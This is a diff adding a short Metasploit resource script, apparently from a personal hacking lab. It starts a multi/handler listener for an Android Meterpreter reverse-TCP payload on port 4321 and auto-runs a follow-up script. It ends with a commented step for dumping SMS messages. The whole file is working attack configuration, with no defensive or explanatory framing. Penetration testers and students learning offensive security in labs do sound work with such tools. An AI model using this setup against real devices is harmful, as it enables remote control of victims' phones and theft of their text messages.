@@ -1,0 +1,7 @@
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lport 4321
+set lhost 0.0.0.0
+set AutoRunScript /media/root/vikas1/1_hack_lab/metasploit/scripts/after/and_s_1.rc
+exploit -o
+#dump_sms
